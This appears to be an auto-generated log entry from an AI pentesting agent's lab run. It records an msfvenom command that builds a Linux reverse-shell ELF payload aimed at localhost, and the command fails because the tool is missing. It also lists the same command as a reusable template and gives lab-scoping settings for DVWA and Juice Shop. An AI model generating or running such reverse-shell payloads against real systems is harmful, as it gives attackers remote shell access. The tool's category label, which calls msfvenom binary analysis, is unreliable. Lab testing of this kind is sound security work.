# msfvenom

## Tool Name & Category
- **Name:** msfvenom
- **Category:** binary (Binary Analysis / Reverse Engineering — disassembly, debugging, firmware)
- **Binary:** `msfvenom`
- **Agent:** exploit
- **DVWA-optimized:** False

## Official Purpose
Payload generation

## Exact Command(s) Executed
```bash
# Safety check: read-only/lab-safe against local Docker targets only
msfvenom -p linux/x64/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4444 -f elf -o /workspace/shell.elf
```

**Target:** `aegis-target`  
**Duration:** 0.1s | **Exit code:** 127

## Full Output Summary
```
bash: line 1: msfvenom: command not found

```

## What I Learned / Edge Cases / Gotchas
- Binary not installed in Kali container — apt install required
- Uses synthetic /workspace artifacts — not live target attack
- Registry template: `msfvenom -p linux/x64/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4444 -f elf -o /workspace/shell.elf {extra}`
- Tags: none

## Effectiveness on This Target (1-10)
**1/10** — Limited output or tool not fully installed

## Recommended Safe Parameters for Learning Labs
- --batch --risk=1 --level=1 for injection tools; -T4 for nmap; target=aegis-target only; no destructive flags
- Timeout: 60s (capped for batch run)
- Always scope to `localhost:8080` (DVWA) or `localhost:3000` (Juice Shop) from host
- Use `aegis-target` / `aegis-juice` hostnames from inside Kali container network

---
*GrokStrike v1.0 — 2026-06-24T05:11:30.443852+00:00*
